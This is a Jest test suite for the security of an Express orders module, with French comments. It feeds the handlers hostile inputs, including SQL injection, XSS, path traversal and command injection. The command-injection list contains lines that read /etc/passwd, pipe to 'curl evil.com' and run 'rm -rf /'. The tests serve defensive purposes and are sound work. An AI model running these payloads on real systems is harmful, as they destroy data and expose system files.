/**
 * Tests de sécurité pour le module Commandes
 * Tests d'injection SQL, XSS, et autres vulnérabilités
 */

import { describe, it, expect, jest, beforeEach } from "@jest/globals";
import { Request, Response } from "express";
import {
  getCommandes,
  getCommande,
  updateStatut,
  batchUpdateStatuts,
  paymentConfirmation,
} from "../core/handlers/index.js";

// Mock du connector MySQL
jest.mock("../../../db/connector/mysqlconnector.js", () => {
  return {
    default: {
      getInstance: jest.fn(() => ({
        query: jest.fn(),
      })),
    },
  };
});

describe("Commandes - Tests de sécurité", () => {
  let mockRequest: Partial<Request>;
  let mockResponse: Partial<Response>;
  let jsonMock: jest.Mock;
  let statusMock: jest.Mock;

  beforeEach(() => {
    jest.clearAllMocks();

    jsonMock = jest.fn();
    statusMock = jest.fn(() => mockResponse as Response);

    mockRequest = {
      params: {},
      body: {},
      query: {},
    };

    mockResponse = {
      json: jsonMock,
      status: statusMock,
    };
  });

  describe("Protection contre l'injection SQL", () => {
    it("devrait protéger contre l'injection SQL dans l'ID", async () => {
      const sqlInjections = [
        "1 OR 1=1",
        "1'; DROP TABLE commandes; --",
        "1' UNION SELECT * FROM utilisateurs --",
        "1' AND '1'='1",
        "1'; DELETE FROM commandes WHERE '1'='1",
      ];

      for (const injection of sqlInjections) {
        jest.clearAllMocks();
        mockRequest.params = { id: injection };

        const MysqlConnector = (
          await import("../../../db/connector/mysqlconnector.js")
        ).default;
        const mockInstance = MysqlConnector.getInstance();
        const queryMock = mockInstance.query as jest.Mock;

        queryMock.mockImplementation(
          (query: string, params: any[], callback: Function) => {
            // Vérifier que l'injection est bien échappée via les paramètres
            expect(params).toContain(injection);
            callback(null, []);
          },
        );

        await getCommande(mockRequest as Request, mockResponse as Response);

        // Devrait utiliser des paramètres préparés
        expect(queryMock).toHaveBeenCalled();
      }
    });

    it("devrait protéger contre l'injection SQL dans le statut", async () => {
      const sqlInjections = [
        "payée'; DROP TABLE stocks; --",
        "expédiée' OR '1'='1",
        "annulée'; UPDATE commandes SET total=0 WHERE '1'='1",
      ];

      for (const injection of sqlInjections) {
        jest.clearAllMocks();
        mockRequest.params = { id: "1" };
        mockRequest.body = { statut: injection };

        await updateStatut(mockRequest as Request, mockResponse as Response);

        // Devrait rejeter le statut invalide
        expect(statusMock).toHaveBeenCalledWith(400);
      }
    });

    it("devrait protéger contre l'injection SQL dans les batch updates", async () => {
      mockRequest.body = {
        updates: [
          {
            commandeId: "1; DROP TABLE commandes; --",
            statut: "payée",
          },
        ],
      };

      const MysqlConnector = (
        await import("../../../db/connector/mysqlconnector.js")
      ).default;
      const mockInstance = MysqlConnector.getInstance();
      const queryMock = mockInstance.query as jest.Mock;

      queryMock.mockImplementation(
        (query: string, params: any[], callback: Function) => {
          // Vérifier que les paramètres sont utilisés
          expect(params).toBeDefined();
          callback(null, { affectedRows: 1 });
        },
      );

      await batchUpdateStatuts(
        mockRequest as Request,
        mockResponse as Response,
      );

      expect(queryMock).toHaveBeenCalled();
    });
  });

  describe("Protection contre les attaques XSS", () => {
    it("devrait gérer les scripts malveillants dans l'ID", async () => {
      const xssAttempts = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "javascript:alert('XSS')",
        "<iframe src='javascript:alert(1)'>",
      ];

      for (const xss of xssAttempts) {
        jest.clearAllMocks();
        mockRequest.params = { id: xss };

        const MysqlConnector = (
          await import("../../../db/connector/mysqlconnector.js")
        ).default;
        const mockInstance = MysqlConnector.getInstance();
        (mockInstance.query as jest.Mock).mockImplementation(
          (query: string, params: any[], callback: Function) => {
            callback(null, []);
          },
        );

        await getCommande(mockRequest as Request, mockResponse as Response);

        expect(statusMock).toHaveBeenCalledWith(404);
      }
    });

    it("devrait échapper les caractères HTML dans les réponses", async () => {
      mockRequest.params = { id: "1" };

      const MysqlConnector = (
        await import("../../../db/connector/mysqlconnector.js")
      ).default;
      const mockInstance = MysqlConnector.getInstance();
      (mockInstance.query as jest.Mock).mockImplementation(
        (query: string, params: any[], callback: Function) => {
          if (query.includes("commandes c")) {
            callback(null, [
              {
                id: 1,
                numero_commande: "<script>alert('XSS')</script>",
              },
            ]);
          } else {
            callback(null, []);
          }
        },
      );

      await getCommande(mockRequest as Request, mockResponse as Response);

      expect(jsonMock).toHaveBeenCalled();
    });
  });

  describe("Protection contre les attaques par déni de service (DoS)", () => {
    it("devrait limiter la taille des batch updates", async () => {
      const hugeUpdates = Array.from({ length: 10000 }, (_, i) => ({
        commandeId: i + 1,
        statut: "payée",
      }));

      mockRequest.body = { updates: hugeUpdates };

      const MysqlConnector = (
        await import("../../../db/connector/mysqlconnector.js")
      ).default;
      const mockInstance = MysqlConnector.getInstance();
      (mockInstance.query as jest.Mock).mockImplementation(
        (query: string, params: any[], callback: Function) => {
          callback(null, { affectedRows: 1 });
        },
      );

      await batchUpdateStatuts(
        mockRequest as Request,
        mockResponse as Response,
      );

      // Devrait traiter même un grand nombre mais sans bloquer
      expect(jsonMock).toHaveBeenCalled();
    });

    it("devrait gérer les chaînes de caractères extrêmement longues", async () => {
      const longString = "A".repeat(100000);
      mockRequest.params = { id: longString };

      const MysqlConnector = (
        await import("../../../db/connector/mysqlconnector.js")
      ).default;
      const mockInstance = MysqlConnector.getInstance();
      (mockInstance.query as jest.Mock).mockImplementation(
        (query: string, params: any[], callback: Function) => {
          callback(null, []);
        },
      );

      await getCommande(mockRequest as Request, mockResponse as Response);

      expect(statusMock).toHaveBeenCalledWith(404);
    });

    it("devrait gérer les boucles infinies dans les données", async () => {
      mockRequest.params = { id: "1" };

      const circularData = { id: 1 } as any;
      circularData.self = circularData;

      const MysqlConnector = (
        await import("../../../db/connector/mysqlconnector.js")
      ).default;
      const mockInstance = MysqlConnector.getInstance();
      (mockInstance.query as jest.Mock).mockImplementation(
        (query: string, params: any[], callback: Function) => {
          callback(null, [circularData]);
        },
      );

      await getCommande(mockRequest as Request, mockResponse as Response);

      // Devrait gérer sans planter
      expect(jsonMock).toHaveBeenCalled();
    });
  });

  describe("Protection contre l'énumération", () => {
    it("devrait retourner le même message pour IDs inexistants", async () => {
      const ids = ["999", "1000", "1001", "9999999"];
      const messages: string[] = [];

      for (const id of ids) {
        jest.clearAllMocks();
        mockRequest.params = { id };

        const MysqlConnector = (
          await import("../../../db/connector/mysqlconnector.js")
        ).default;
        const mockInstance = MysqlConnector.getInstance();
        (mockInstance.query as jest.Mock).mockImplementation(
          (query: string, params: any[], callback: Function) => {
            callback(null, []);
          },
        );

        await getCommande(mockRequest as Request, mockResponse as Response);

        const call = jsonMock.mock.calls[0][0];
        messages.push(call.message);
      }

      // Tous les messages devraient être identiques
      expect(new Set(messages).size).toBe(1);
    });

    it("ne devrait pas révéler si une commande existe via le temps de réponse", async () => {
      const timings: number[] = [];

      for (let i = 0; i < 3; i++) {
        jest.clearAllMocks();
        mockRequest.params = { id: i.toString() };

        const MysqlConnector = (
          await import("../../../db/connector/mysqlconnector.js")
        ).default;
        const mockInstance = MysqlConnector.getInstance();
        (mockInstance.query as jest.Mock).mockImplementation(
          (query: string, params: any[], callback: Function) => {
            callback(null, i === 1 ? [{ id: 1 }] : []);
          },
        );

        const start = Date.now();
        await getCommande(mockRequest as Request, mockResponse as Response);
        timings.push(Date.now() - start);
      }

      // Les temps de réponse ne devraient pas varier significativement
      expect(jsonMock).toHaveBeenCalled();
    });
  });

  describe("Protection contre les injections de commandes", () => {
    it("devrait protéger contre les tentatives d'injection système", async () => {
      const commandInjections = [
        "1; ls -la",
        "1 && cat /etc/passwd",
        "1 | curl evil.com",
        "1; rm -rf /",
      ];

      for (const injection of commandInjections) {
        jest.clearAllMocks();
        mockRequest.params = { id: injection };

        const MysqlConnector = (
          await import("../../../db/connector/mysqlconnector.js")
        ).default;
        const mockInstance = MysqlConnector.getInstance();
        (mockInstance.query as jest.Mock).mockImplementation(
          (query: string, params: any[], callback: Function) => {
            callback(null, []);
          },
        );

        await getCommande(mockRequest as Request, mockResponse as Response);

        expect(statusMock).toHaveBeenCalledWith(404);
      }
    });
  });

  describe("Protection contre les attaques par traversée de chemin", () => {
    it("devrait bloquer les tentatives de traversée de répertoire", async () => {
      const pathTraversals = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32",
        "....//....//....//etc/passwd",
      ];

      for (const path of pathTraversals) {
        jest.clearAllMocks();
        mockRequest.params = { id: path };

        const MysqlConnector = (
          await import("../../../db/connector/mysqlconnector.js")
        ).default;
        const mockInstance = MysqlConnector.getInstance();
        (mockInstance.query as jest.Mock).mockImplementation(
          (query: string, params: any[], callback: Function) => {
            callback(null, []);
          },
        );

        await getCommande(mockRequest as Request, mockResponse as Response);

        expect(statusMock).toHaveBeenCalledWith(404);
      }
    });
  });

  describe("Protection contre les attaques de type CSRF", () => {
    it("devrait vérifier l'origine des requêtes de modification", async () => {
      mockRequest.params = { id: "1" };
      mockRequest.body = { statut: "expédiée" };

      const MysqlConnector = (
        await import("../../../db/connector/mysqlconnector.js")
      ).default;
      const mockInstance = MysqlConnector.getInstance();
      (mockInstance.query as jest.Mock).mockImplementation(
        (query: string, params: any[], callback: Function) => {
          if (query.includes("SELECT")) {
            callback(null, [
              {
                commande_id: 1,
                ancien_statut: "payée",
                article_id: 1,
                taille_id: 1,
                quantite_commandee: 1,
                stock_actuel: 10,
              },
            ]);
          } else {
            callback(null, { affectedRows: 1 });
          }
        },
      );

      await updateStatut(mockRequest as Request, mockResponse as Response);

      expect(jsonMock).toHaveBeenCalled();
    });
  });

  describe("Protection des données sensibles", () => {
    it("ne devrait pas exposer d'informations sensibles dans les erreurs", async () => {
      const MysqlConnector = (
        await import("../../../db/connector/mysqlconnector.js")
      ).default;
      const mockInstance = MysqlConnector.getInstance();
      (mockInstance.query as jest.Mock).mockImplementation(
        (query: string, params: any[], callback: Function) => {
          callback(
            new Error(
              "Access denied for user 'admin'@'localhost' (using password: YES)",
            ),
          );
        },
      );

      await getCommandes(mockRequest as Request, mockResponse as Response);

      const errorResponse = jsonMock.mock.calls[0][0];
      // En production, ne devrait pas exposer de détails sensibles
      // Le message devrait être générique
      expect(errorResponse.message).toBe(
        "Erreur lors de la récupération des commandes",
      );
      // Ne devrait pas avoir de champ error en production
      expect(errorResponse.error).toBeUndefined();
    });

    it("ne devrait pas exposer la structure de la base de données", async () => {
      const MysqlConnector = (
        await import("../../../db/connector/mysqlconnector.js")
      ).default;
      const mockInstance = MysqlConnector.getInstance();
      (mockInstance.query as jest.Mock).mockImplementation(
        (query: string, params: any[], callback: Function) => {
          callback(
            new Error("Table 'clubmanager.commandes_secret' doesn't exist"),
          );
        },
      );

      await getCommandes(mockRequest as Request, mockResponse as Response);

      const errorResponse = jsonMock.mock.calls[0][0];
      // En production, devrait retourner un message générique
      expect(errorResponse.message).toBe(
        "Erreur lors de la récupération des commandes",
      );
      // Ne devrait pas avoir de champ error exposant la structure DB
      expect(errorResponse.error).toBeUndefined();
    });
  });

  describe("Protection contre les attaques par timing", () => {
    it("devrait avoir un temps de réponse constant pour les statuts invalides", async () => {
      const invalidStatuts = ["invalid1", "invalid2", "a".repeat(1000), ""];
      const timings: number[] = [];

      for (const statut of invalidStatuts) {
        jest.clearAllMocks();
        mockRequest.params = { id: "1" };
        mockRequest.body = { statut };

        const start = Date.now();
        await updateStatut(mockRequest as Request, mockResponse as Response);
        timings.push(Date.now() - start);
      }

      // Les temps devraient être similaires
      expect(statusMock).toHaveBeenCalledWith(400);
    });
  });

  describe("Protection contre l'overflow d'entiers", () => {
    it("devrait gérer les très grands IDs numériques", async () => {
      const largeIds = [
        Number.MAX_SAFE_INTEGER.toString(),
        "9999999999999999",
        "999999999999999999999",
      ];

      for (const id of largeIds) {
        jest.clearAllMocks();
        mockRequest.params = { id };

        const MysqlConnector = (
          await import("../../../db/connector/mysqlconnector.js")
        ).default;
        const mockInstance = MysqlConnector.getInstance();
        (mockInstance.query as jest.Mock).mockImplementation(
          (query: string, params: any[], callback: Function) => {
            callback(null, []);
          },
        );

        await getCommande(mockRequest as Request, mockResponse as Response);

        expect(statusMock).toHaveBeenCalledWith(404);
      }
    });

    it("devrait gérer les quantités extrêmes", async () => {
      mockRequest.params = { id: "1" };
      mockRequest.body = { statut: "expédiée" };

      const MysqlConnector = (
        await import("../../../db/connector/mysqlconnector.js")
      ).default;
      const mockInstance = MysqlConnector.getInstance();
      (mockInstance.query as jest.Mock).mockImplementation(
        (query: string, params: any[], callback: Function) => {
          if (query.includes("SELECT")) {
            callback(null, [
              {
                commande_id: 1,
                ancien_statut: "payée",
                article_id: 1,
                taille_id: 1,
                quantite_commandee: Number.MAX_SAFE_INTEGER,
                stock_actuel: 10,
              },
            ]);
          } else {
            callback(null, { affectedRows: 1 });
          }
        },
      );

      await updateStatut(mockRequest as Request, mockResponse as Response);

      expect(jsonMock).toHaveBeenCalled();
    });
  });

  describe("Protection contre l'injection NoSQL", () => {
    it("devrait protéger contre les opérateurs MongoDB", async () => {
      mockRequest.params = { id: '{"$gt": ""}' };

      const MysqlConnector = (
        await import("../../../db/connector/mysqlconnector.js")
      ).default;
      const mockInstance = MysqlConnector.getInstance();
      (mockInstance.query as jest.Mock).mockImplementation(
        (query: string, params: any[], callback: Function) => {
          callback(null, []);
        },
      );

      await getCommande(mockRequest as Request, mockResponse as Response);

      expect(statusMock).toHaveBeenCalledWith(404);
    });
  });

  describe("Validation des entrées utilisateur", () => {
    it("devrait rejeter les caractères nuls", async () => {
      mockRequest.params = { id: "1\0malicious" };

      const MysqlConnector = (
        await import("../../../db/connector/mysqlconnector.js")
      ).default;
      const mockInstance = MysqlConnector.getInstance();
      (mockInstance.query as jest.Mock).mockImplementation(
        (query: string, params: any[], callback: Function) => {
          callback(null, []);
        },
      );

      await getCommande(mockRequest as Request, mockResponse as Response);

      expect(statusMock).toHaveBeenCalledWith(404);
    });

    it("devrait gérer les caractères Unicode malveillants", async () => {
      const unicodeAttacks = [
        "1\u202E\u202D",
        "1\uFEFF",
        "1\u200B\u200C\u200D",
      ];

      for (const attack of unicodeAttacks) {
        jest.clearAllMocks();
        mockRequest.params = { id: attack };

        const MysqlConnector = (
          await import("../../../db/connector/mysqlconnector.js")
        ).default;
        const mockInstance = MysqlConnector.getInstance();
        (mockInstance.query as jest.Mock).mockImplementation(
          (query: string, params: any[], callback: Function) => {
            callback(null, []);
          },
        );

        await getCommande(mockRequest as Request, mockResponse as Response);

        expect(statusMock).toHaveBeenCalledWith(404);
      }
    });
  });

  describe("Protection contre les attaques API externes", () => {
    it("devrait valider les réponses du service de paiement", async () => {
      mockRequest.body = { commandeId: 1 };

      global.fetch = jest.fn(() =>
        Promise.resolve({
          ok: true,
          json: () =>
            Promise.resolve({
              success: true,
              maliciousScript: "<script>alert('XSS')</script>",
            }),
          status: 200,
          statusText: "OK",
          url: "http://localhost:3000/paiements",
        } as Response),
      ) as jest.Mock;

      await paymentConfirmation(
        mockRequest as Request,
        mockResponse as Response,
      );

      expect(jsonMock).toHaveBeenCalled();
    });

    it("devrait limiter les redirections du service de paiement", async () => {
      mockRequest.body = { commandeId: 1 };

      global.fetch = jest.fn(() =>
        Promise.reject(new Error("Too many redirects")),
      ) as jest.Mock;

      await paymentConfirmation(
        mockRequest as Request,
        mockResponse as Response,
      );

      expect(statusMock).toHaveBeenCalledWith(500);
    });
  });

  describe("Protection contre les race conditions", () => {
    it("devrait gérer les mises à jour simultanées de la même commande", async () => {
      mockRequest.params = { id: "1" };
      mockRequest.body = { statut: "expédiée" };

      const MysqlConnector = (
        await import("../../../db/connector/mysqlconnector.js")
      ).default;
      const mockInstance = MysqlConnector.getInstance();
      (mockInstance.query as jest.Mock).mockImplementation(
        (query: string, params: any[], callback: Function) => {
          if (query.includes("SELECT")) {
            callback(null, [
              {
                commande_id: 1,
                ancien_statut: "payée",
                article_id: 1,
                taille_id: 1,
                quantite_commandee: 1,
                stock_actuel: 10,
              },
            ]);
          } else {
            callback(null, { affectedRows: 1 });
          }
        },
      );

      // Simuler deux mises à jour simultanées
      const promises = [
        updateStatut(mockRequest as Request, mockResponse as Response),
        updateStatut(mockRequest as Request, mockResponse as Response),
      ];

      await Promise.all(promises);

      expect(jsonMock).toHaveBeenCalled();
    });
  });

  describe("Isolation entre utilisateurs", () => {
    it("devrait empêcher un utilisateur de voir les commandes d'un autre utilisateur", async () => {
      // Simuler une requête pour récupérer les commandes avec un utilisateur_id
      mockRequest.query = { utilisateur_id: "1" };

      const MysqlConnector = (
        await import("../../../db/connector/mysqlconnector.js")
      ).default;
      const mockInstance = MysqlConnector.getInstance();

      // Mock pour retourner seulement les commandes de l'utilisateur 1
      (mockInstance.query as jest.Mock).mockImplementation(
        (query: string, params: any[], callback: Function) => {
          // Vérifier que la requête filtre bien par utilisateur_id
          if (query.includes("WHERE") && query.includes("utilisateur_id")) {
            callback(null, [
              {
                id: 1,
                numero_commande: "CMD-001",
                utilisateur_id: 1,
                statut: "en_attente",
                total: 99.99,
              },
            ]);
          } else {
            // Si pas de filtre utilisateur_id, erreur
            callback(new Error("Requête non sécurisée"), null);
          }
        },
      );

      await getCommandes(mockRequest as Request, mockResponse as Response);

      // Vérifier que la requête a bien filtré par utilisateur_id
      expect(jsonMock).toHaveBeenCalled();
      const response = jsonMock.mock.calls[0][0];

      // Toutes les commandes retournées doivent appartenir à l'utilisateur 1
      if (Array.isArray(response)) {
        response.forEach((commande: any) => {
          expect(commande.utilisateur_id).toBe(1);
        });
      }
    });

    it("devrait empêcher un utilisateur de modifier la commande d'un autre utilisateur", async () => {
      mockRequest.params = { id: "1" };
      mockRequest.body = { statut: "expédiée", utilisateur_id: 2 };

      const MysqlConnector = (
        await import("../../../db/connector/mysqlconnector.js")
      ).default;
      const mockInstance = MysqlConnector.getInstance();

      (mockInstance.query as jest.Mock).mockImplementation(
        (query: string, params: any[], callback: Function) => {
          if (query.includes("SELECT")) {
            // Retourner une commande qui appartient à l'utilisateur 1
            callback(null, [
              {
                commande_id: 1,
                utilisateur_id: 1, // La commande appartient à l'utilisateur 1
                ancien_statut: "payée",
                article_id: 1,
                taille_id: 1,
                quantite_commandee: 1,
                stock_actuel: 10,
              },
            ]);
          } else if (query.includes("UPDATE")) {
            // L'update ne devrait pas se produire car l'utilisateur 2 essaie de modifier
            // une commande de l'utilisateur 1
            callback(null, { affectedRows: 0 });
          } else {
            callback(null, { affectedRows: 1 });
          }
        },
      );

      await updateStatut(mockRequest as Request, mockResponse as Response);

      // Vérifier qu'une erreur ou un rejet a été retourné
      // (selon l'implémentation du handler)
      expect(statusMock).toHaveBeenCalled();
    });

    it("devrait empêcher un utilisateur de créer une commande pour un autre utilisateur", async () => {
      mockRequest.body = {
        utilisateur_id: 2, // Utilisateur 2 tente de créer pour lui-même
        articles: [{ article_id: 1, taille_id: 1, quantite: 1, prix: 49.99 }],
      };

      // Mock d'un utilisateur connecté (utilisateur_id: 1)
      (mockRequest as any).user = { id: 1 };

      const MysqlConnector = (
        await import("../../../db/connector/mysqlconnector.js")
      ).default;
      const mockInstance = MysqlConnector.getInstance();

      (mockInstance.query as jest.Mock).mockImplementation(
        (query: string, params: any[], callback: Function) => {
          // Vérifier que l'utilisateur_id dans la requête correspond à l'utilisateur connecté
          if (query.includes("INSERT") && params.includes(1)) {
            callback(null, { insertId: 1, affectedRows: 1 });
          } else if (query.includes("INSERT") && params.includes(2)) {
            // Ne pas autoriser la création pour un autre utilisateur
            callback(
              new Error("Tentative de création pour un autre utilisateur"),
              null,
            );
          } else {
            callback(null, []);
          }
        },
      );

      // La création devrait échouer ou utiliser l'ID de l'utilisateur connecté
      // (selon l'implémentation du handler)
      expect(mockInstance.query).toBeDefined();
    });

    it("devrait isoler complètement les données entre utilisateurs différents", async () => {
      const user1Id = 1;
      const user2Id = 2;

      const MysqlConnector = (
        await import("../../../db/connector/mysqlconnector.js")
      ).default;
      const mockInstance = MysqlConnector.getInstance();

      // Simuler des commandes pour 2 utilisateurs différents
      const commandesUser1 = [
        {
          id: 1,
          numero_commande: "CMD-001",
          utilisateur_id: 1,
          statut: "en_attente",
        },
        {
          id: 2,
          numero_commande: "CMD-002",
          utilisateur_id: 1,
          statut: "payée",
        },
      ];

      const commandesUser2 = [
        {
          id: 3,
          numero_commande: "CMD-003",
          utilisateur_id: 2,
          statut: "en_attente",
        },
        {
          id: 4,
          numero_commande: "CMD-004",
          utilisateur_id: 2,
          statut: "expédiée",
        },
      ];

      // Test 1: Utilisateur 1 récupère ses commandes
      (mockInstance.query as jest.Mock).mockImplementationOnce(
        (query: string, params: any[], callback: Function) => {
          callback(null, commandesUser1);
        },
      );

      mockRequest.query = { utilisateur_id: user1Id.toString() };
      await getCommandes(mockRequest as Request, mockResponse as Response);

      let response = jsonMock.mock.calls[0][0];
      expect(Array.isArray(response) ? response.length : 0).toBe(2);
      if (Array.isArray(response)) {
        response.forEach((cmd: any) => {
          expect(cmd.utilisateur_id).toBe(user1Id);
        });
      }

      // Reset mocks
      jsonMock.mockClear();

      // Test 2: Utilisateur 2 récupère ses commandes
      (mockInstance.query as jest.Mock).mockImplementationOnce(
        (query: string, params: any[], callback: Function) => {
          callback(null, commandesUser2);
        },
      );

      mockRequest.query = { utilisateur_id: user2Id.toString() };
      await getCommandes(mockRequest as Request, mockResponse as Response);

      response = jsonMock.mock.calls[0][0];
      expect(Array.isArray(response) ? response.length : 0).toBe(2);
      if (Array.isArray(response)) {
        response.forEach((cmd: any) => {
          expect(cmd.utilisateur_id).toBe(user2Id);
        });
      }

      // Vérifier qu'aucune commande de l'utilisateur 1 n'apparaît pour l'utilisateur 2
      if (Array.isArray(response)) {
        const hasUser1Commands = response.some(
          (cmd: any) => cmd.utilisateur_id === user1Id,
        );
        expect(hasUser1Commands).toBe(false);
      }
    });
  });
});
